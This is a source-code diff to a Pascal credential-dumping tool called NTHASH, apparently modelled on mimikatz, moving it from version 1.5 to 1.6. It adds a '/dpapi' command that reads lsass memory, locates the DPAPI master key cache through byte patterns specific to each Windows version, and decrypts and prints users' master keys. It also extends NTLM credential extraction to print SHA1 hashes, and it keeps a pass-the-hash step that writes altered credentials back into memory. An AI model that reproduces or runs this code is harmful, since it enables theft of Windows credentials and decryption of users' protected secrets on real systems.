@@ -19,8 +19,11 @@ end;
   //session_entry to creds_entry to cred_hash_entry to ntlm_creds_block
 
   type _credentialkeys=record
-       unk1:array[0..55] of byte; //lots of things i am missing ...
+       unk1:array[0..51] of byte; //lots of things i am missing ...
+       ntlm_len:dword;
        ntlmhash:array[0..15] of byte;
+       sha1_len:dword;
+       sha1:array[0..19] of byte;
        end;
     Pcredentialkeys=^_credentialkeys;
   type _CRED_NTLM_BLOCK=record
@@ -36,6 +39,13 @@ end;
        unk3:dword;
        usernameoff:word;
        unk4:array[0..5] of byte;
+       //+32
+       ntlmhash:tbyte16; //array[0..15] of byte;
+       lmhash:tbyte16; //array[0..15] of byte;
+       //+64
+       sha1:array[0..19] of byte; //sha1
+       //domain
+       //username
         {$endif CPU64}
         {$ifdef CPU32}
         domainlen1:word;
@@ -48,13 +58,7 @@ end;
         unk3:word;
         unk4:tbyte16;
         {$endif CPU32}
-       //+32
-       ntlmhash:tbyte16; //array[0..15] of byte;
-       lmhash:tbyte16; //array[0..15] of byte;
-       //+64
-       //sha1
-       //domain
-       //username
+
        end;
     PCRED_NTLM_BLOCK=^_CRED_NTLM_BLOCK;
 
@@ -211,7 +215,7 @@ type _generic_list=record
 end;
  Pgeneric_list=^_generic_list;
 
-type _LIST_ENTRY =record
+type _LIST_ENTRY =record   //16 * 8 = 128
    Flink:nativeuint;                      //0
    Blink:nativeuint;                      //8
    unk1:nativeuint; //608bc8c0 000000b2   //16
@@ -284,7 +288,17 @@ type i_logsesslist=record
        end;
     {$endif CPU32}
 
-
+    type _KIWI_MASTERKEY_CACHE_ENTRY =record
+    	Flink:nativeuint;
+    	Blink:nativeuint;
+    	LogonId:_LUID;
+    	KeyUid:GUID;
+    	insertTime:FILETIME; //or LARGE_INTEGER
+    	keySize:ULONG;
+    	key:array [0..127] of byte;
+    end;
+    KIWI_MASTERKEY_CACHE_ENTRY=_KIWI_MASTERKEY_CACHE_ENTRY;
+    PKIWI_MASTERKEY_CACHE_ENTRY=^KIWI_MASTERKEY_CACHE_ENTRY;
 
 
 
@@ -548,6 +562,191 @@ begin
        closehandle(hprocess);
        end;//if openprocess...
 
+end;
+
+function dpapi(pid:dword):boolean;
+const
+  PTRN_W2K3_MasterKeyCacheList:array [0..7] of byte= ($4d, $3b, $ee, $49, $8b, $fd, $0f, $85);
+  PTRN_WI60_MasterKeyCacheList:array [0..7] of byte= ($49, $3b, $ef, $48, $8b, $fd, $0f, $84);
+  PTRN_WI61_MasterKeyCacheList:array [0..6] of byte= ($33, $c0, $eb, $20, $48, $8d, $05);  // InitializeKeyCache to avoid  version change
+  PTRN_WI62_MasterKeyCacheList:array [0..12] of byte= ($4c, $89, $1f, $48, $89, $47, $08, $49, $39, $43, $08, $0f, $85);
+  PTRN_WI63_MasterKeyCacheList:array [0..6] of byte= ($08, $48, $39, $48, $08, $0f, $85);
+  PTRN_WI64_MasterKeyCacheList:array [0..7] of byte= ($48, $89, $4e, $08, $48, $39, $48, $08);
+  PTRN_WI64_1607_MasterKeyCacheList:array [0..7] of byte= ($48, $89, $4f, $08, $48, $89, $78, $08);
+//
+ PTRN_WALL_MasterKeyCacheList_x86:array [0..3] of byte= ($33, $c0, $40, $a3);
+ PTRN_WI60_MasterKeyCacheList_x86:array [0..9] of byte= ($8b, $f0, $81, $fe, $cc, $06, $00, $00, $0f, $84);
+//
+  CALG_SHA1 = $00008004;
+  SHA_DIGEST_LENGTH = 20;
+var
+  module:string='dpapisrv.dll';
+  pattern:array of byte;
+  patch_pos:ShortInt=0;
+  hprocess,hmod:thandle;
+  hmods:array[0..1023] of thandle;
+  MODINFO:  MODULEINFO;
+  cbNeeded,count:	 DWORD;
+  szModName:array[0..254] of char;
+  addr_:pointer;
+  offset:nativeint=0;
+  offset_list:array[0..3] of byte;
+  offset_list_dword:dword;
+  list:array[0..sizeof(_LIST_ENTRY)-1] of byte;
+  dgst:tbytes; //array[0..19] of byte;
+  current:nativeuint;
+  decrypted:tbytes;
+  localft:FILETIME ;
+  st:SYSTEMTIME ;
+begin
+//
+   if (lowercase(osarch)='x86') then
+   begin
+   if copy(winver,1,3)='5.1' then //xp
+      begin
+      setlength(pattern,sizeof(PTRN_WALL_MasterKeyCacheList_x86));
+      copymemory(@pattern[0],@PTRN_WALL_MasterKeyCacheList_x86[0],sizeof(PTRN_WALL_MasterKeyCacheList_x86));
+      patch_pos:=-4;
+      end;
+   if copy(winver,1,3)='6.2' then  //win8.0
+      begin
+      setlength(pattern,sizeof(PTRN_WI60_MasterKeyCacheList_x86));
+      copymemory(@pattern[0],@PTRN_WI60_MasterKeyCacheList_x86[0],sizeof(PTRN_WI60_MasterKeyCacheList_x86));
+      patch_pos:=16;
+      end ;
+      if copy(winver,1,3)='6.3' then  //win8.1 aka winblue
+      begin
+      setlength(pattern,sizeof(PTRN_WALL_MasterKeyCacheList_x86));
+      copymemory(@pattern[0],@PTRN_WALL_MasterKeyCacheList_x86[0],sizeof(PTRN_WALL_MasterKeyCacheList_x86));
+      patch_pos:=-4;
+      end ;
+   end;
+  if (lowercase(osarch)='amd64') then
+   begin
+   if copy(winver,1,3)='6.0' then //vista
+      begin
+      setlength(pattern,sizeof(PTRN_WI60_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI60_MasterKeyCacheList[0],sizeof(PTRN_WI60_MasterKeyCacheList));
+      patch_pos:=-4;
+      end ;
+   if copy(winver,1,3)='6.1' then  //win7 & 2k8
+      begin
+      setlength(pattern,sizeof(PTRN_WI61_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI61_MasterKeyCacheList[0],sizeof(PTRN_WI61_MasterKeyCacheList));
+      patch_pos:=7;
+      end ;
+   if copy(winver,1,3)='6.2' then  //win8.0
+      begin
+      setlength(pattern,sizeof(PTRN_WI62_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI62_MasterKeyCacheList[0],sizeof(PTRN_WI62_MasterKeyCacheList));
+      patch_pos:=-4;
+      end ;
+   if copy(winver,1,3)='6.3' then  //win8.1 aka winblue
+      begin
+      setlength(pattern,sizeof(PTRN_WI63_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI63_MasterKeyCacheList[0],sizeof(PTRN_WI63_MasterKeyCacheList));
+      patch_pos:=-10;
+      end ;
+   if (pos('-1507',winver)>0) {or (pos('-1509',winver)>0)} then //win10
+      begin
+      setlength(pattern,sizeof(PTRN_WI64_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI64_MasterKeyCacheList[0],sizeof(PTRN_WI64_MasterKeyCacheList));
+      patch_pos:=-7;
+      end;
+   if (pos('-1607',winver)>0) {or (pos('-1609',winver)>0)} then //win10
+      begin
+      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      patch_pos:=11;
+      end;
+   end;
+//
+hprocess:=thandle(-1);
+hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+                                      false,pid);
+
+  if hprocess<>thandle(-1) then
+       begin
+       log('openprocess ok',0);
+       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
+       cbneeded:=0;
+       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
+               begin
+               log('EnumProcessModules OK',0);
+
+               for count:=0 to cbneeded div sizeof(thandle) do
+                   begin
+                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
+                      begin
+                      //dummy:=lowercase(strpas(szModName ));
+                      if pos(lowercase(module),lowercase(strpas(szModName )))>0 then
+                         begin
+                         log(module+' found:'+inttohex(hMods[count],8),0);
+                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
+                            begin
+                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
+                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
+                            addr_:=MODINFO.lpBaseOfDll;
+                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
+                            log('Searching...',0);
+                            offset:=searchmem(hprocess,addr_,MODINFO.SizeOfImage,pattern);
+                            log('Done!',0);
+                            if offset<>0 then
+                                 begin
+                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
+                                 //
+
+                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
+                                 begin
+                                      CopyMemory(@offset_list_dword,@offset_list[0],4);
+                                      log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
+                                      //new offset to the list entry
+                                      {$ifdef CPU64}
+                                      offset:= offset+offset_list_dword+4+patch_pos;
+                                      {$endif CPU64}
+                                      {$ifdef CPU32}
+                                      offset:= offset_list_dword{+patch_pos};
+                                      {$endif CPU32}
+                                      log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
+                                      //
+                                      //read sesslist at offset
+                                      ReadMem  (hprocess,offset,list );
+                                      //lets skip the first one
+                                      current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
+                                      ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
+                                      log('*****************************************************',1);
+                                      while PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink<>offset do
+                                      begin
+                                      //
+                                      log('LUID:'+inttohex(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).LogonId.LowPart,4) ,1) ;
+                                      log('GUID:'+GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).KeyUid),1) ;
+                                      FileTimeToLocalFileTime (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).insertTime,localft) ;
+                                      FileTimeToSystemTime(localft, st );
+                                      log('Time:'+DateTimeToStr (SystemTimeToDateTime (st)),1);
+                                      setlength(decrypted,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize);
+                                      if decryptLSA (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize ,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).key ,decrypted)=false
+                                      then log('decryptLSA NOT OK',1)
+                                      else
+                                      begin
+                                      log('MasterKey:'+ByteToHexaString(decrypted),1);
+                                      if crypto_hash(CALG_SHA1, @decrypted[0], PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize, dgst, SHA_DIGEST_LENGTH )
+                                         then log('SHA1:'+ByteToHexaString (dgst),1);
+                                      end;
+                                      //next logsesslist
+                                      current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
+                                      ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
+                                      log('*****************************************************',1)
+                                      end;
+                                 end; //if readmem
+
+                                 end;
+                            end;//if GetModuleInformation...
+                         end; //if pos('samsrv.dll',dummy)>0 then
+                      end; //if GetModuleFileNameExA
+                   end; //for count:=0...
+               end; //if EnumProcessModules...
+       closehandle(hprocess);
+       end;//if openprocess...
 end;
 
 //check kuhl_m_sekurlsa_utils.c
@@ -833,9 +1032,11 @@ begin
                                                           log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
                                                           {$ifdef CPU64}
                                                           log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
+                                                          log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).sha1) ,1);
                                                           {$endif CPU64}
                                                           {$ifdef CPU32}
                                                           log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).unk4) ,1);
+                                                          //log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).sha1) ,1);
                                                           {$endif CPU32}
                                                           //PTH time ! lets modify the crendential buffer and write it back to mem
                                                           if (luid<>0) and (hash<>'') then
@@ -856,6 +1057,7 @@ begin
                                                           begin
                                                           log('->CredentialKeys',1);
                                                           log('ntlm:'+ByteToHexaString(Pcredentialkeys(@decrypted[0]).ntlmhash) ,1);
+                                                          log('sha1:'+ByteToHexaString(Pcredentialkeys(@decrypted[0]).sha1) ,1);
                                                           end;
                                                        end;
                                        end;//if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0 then
@@ -1242,7 +1444,7 @@ begin
 end;
 
 begin
-  log('NTHASH 1.5 by erwan2212@gmail.com',1);
+  log('NTHASH 1.6 by erwan2212@gmail.com',1);
   winver:=GetWindowsVer;
   osarch:=getenv('PROCESSOR_ARCHITECTURE');
   getmem(sysdir,Max_Path );
@@ -1273,7 +1475,7 @@ begin
   log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newpwd:xxx',1);
   log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newhash:xxx',1);
   log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newhash:xxx',1);
-  log('NTHASH /gethash /password:password',1);
+  log('NTHASH /getntlmhash /input:password',1);
   //*******************************************
   log('NTHASH /getsid /user:username [/server:hostname]',1);
   log('NTHASH /getusers [/server:hostname]',1);
@@ -1298,13 +1500,17 @@ begin
   //****************************************************
   log('NTHASH /bytetostring /input:hexabytes',1);
   log('NTHASH /stringtobyte /input:string',1);
+  log('NTHASH /widestringtobyte /input:string',1);
   log('NTHASH /base64encodew /input:string',1);
   log('NTHASH /base64encode /input:string',1);
   log('NTHASH /base64decode /input:base64string',1);
   //****************************************************
+  log('NTHASH /dpapi',1);
   log('NTHASH /cryptunprotectdata /binary:filename',1);
   log('NTHASH /cryptunprotectdata /input:string',1);
   log('NTHASH /cryptprotectdata /input:string',1);
+  log('NTHASH /decodeblob /binary:filename',1);
+  log('NTHASH /decodemk /binary:filename',1);
   //****************************************************
   log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
@@ -1396,6 +1602,13 @@ begin
         end;
      goto fin;
      end;
+  p:=pos('/dpapi',cmdline);
+  if p>0 then
+     begin
+     findlsakeys (lsass_pid,deskey,aeskey,iv );
+     dpapi (lsass_pid );
+     goto fin;
+     end;
   p:=pos('/logonpasswords',cmdline);
   if p>0 then
      begin
@@ -1464,12 +1677,21 @@ begin
      begin
      if input='' then exit;
      log('BytetoString:'+BytetoAnsiString (HexaStringToByte (input)),1);
+     goto fin;
      end;
   p:=pos('/stringtobyte',cmdline);
   if p>0 then
      begin
      if input='' then exit;
      log('StringtoByte:'+ ByteToHexaString ( AnsiStringtoByte(input)),1);
+     goto fin;
+     end;
+  p:=pos('/widestringtobyte',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+     log('widestringtobyte:'+ ByteToHexaString ( AnsiStringtoByte(input,true)),1);
+     goto fin;
      end;
   p:=pos('/base64encodew',cmdline);
   if p>0 then
@@ -1681,11 +1903,11 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
              delete(domain,pos(' ',domain),255);
              //log(domain);
              end;
-    p:=pos('/gethash',cmdline);
+    p:=pos('/getntlmhash',cmdline);
       if p>0 then
            begin
-           if password='' then exit;
-           log (GenerateNTLMHash (password),1);
+           if input='' then exit;
+           log (GenerateNTLMHash (input),1);
            goto fin;
            end;
   p:=pos('/getusers',cmdline);
